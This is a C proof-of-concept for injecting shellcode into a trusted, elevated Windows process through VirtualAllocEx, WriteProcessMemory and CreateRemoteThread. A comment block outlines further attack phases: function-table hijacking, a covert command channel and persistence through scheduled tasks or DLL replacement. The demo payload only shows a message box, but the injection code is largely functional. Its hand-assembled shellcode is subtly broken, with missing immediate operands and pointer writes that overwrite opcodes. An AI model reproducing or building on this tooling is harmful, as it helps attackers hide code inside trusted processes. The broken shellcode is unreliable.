// hijack_point_poc.c
// Remote injection PoC with full stack execution chain mapping

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/* === STACK EXECUTION CHAIN OVERVIEW ===


[PHASE 0] TARGET PREPARATION
- Identify trusted process (e.g., GameBarElevatedFT.exe)
- Confirm admin privileges and signature trust


[PHASE 1] PAYLOAD SEEDING
- Allocate RWX memory in target process
- Inject payload (GhostPayload) and message string


[PHASE 2] FUNCTION TABLE HIJACK
- Overwrite trusted dispatch table (e.g., xboxwebdll offsets)
- Redirect function pointers to injected GhostPayload address


[PHASE 3] CALLBACK TRIGGER
- Legit system activity triggers callback (rcx/rdx/r8 slot)
- GhostPayload is executed inside target process context


[PHASE 4] RETURN PATH / COMMAND CHANNEL (OPTIONAL)
- Encrypted memory regions or registry slots for I/O
- ReactNativeAsyncStorage or NTPFN stub as dead drop
- IPC via named pipe or HTTP/IPv6 callback


[PHASE 5] PERSISTENCE (EXTENSION)
- Reinject on reboot via trusted loader (e.g., Scheduled Task)
- Replace legitimate DLL or hijack function tables at runtime


*/

// Payload: MessageBox for demo
unsigned char GhostPayload[] = {
    0x48, 0x83, 0xEC, 0x28,
    0x48, 0xB8, /* ptr to MessageBoxA */
    0x48, 0x89, 0xC1,
    0x48, 0xB8, /* ptr to string */
    0x48, 0x89, 0xC2,
    0x33, 0xC9,
    0xB8, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD1,
    0x48, 0x83, 0xC4, 0x28,
    0xC3};

DWORD FindTargetPid(const wchar_t *targetName)
{
    PROCESSENTRY32W entry = {.dwSize = sizeof(PROCESSENTRY32W)};
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            if (_wcsicmp(entry.szExeFile, targetName) == 0)
            {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main()
{
    const wchar_t *targetProc = L"GameBarElevatedFT.exe";
    DWORD pid = FindTargetPid(targetProc);
    if (!pid)
    {
        printf("[-] Target process not found.\n");
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc)
    {
        printf("[-] Failed to open target process.\n");
        return 1;
    }

    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, sizeof(GhostPayload) + 512, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem)
    {
        printf("[-] Allocation failed.\n");
        CloseHandle(hProc);
        return 1;
    }
    FARPROC msgBoxAddr = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
    char *payload = (char *)GhostPayload;
    *(void **)&payload[6] = msgBoxAddr;

    const char *msg = "Remote GhostPayload Triggered.";
    *(void **)&payload[16] = (char *)remoteMem + sizeof(GhostPayload);

    WriteProcessMemory(hProc, remoteMem, GhostPayload, sizeof(GhostPayload), NULL);
    WriteProcessMemory(hProc, (LPVOID)((char *)remoteMem + sizeof(GhostPayload)), msg, strlen(msg) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread)
    {
        printf("[-] CreateRemoteThread failed.\n");
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    printf("[+] Remote GhostPayload injected and executing.\n");
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return 0;
}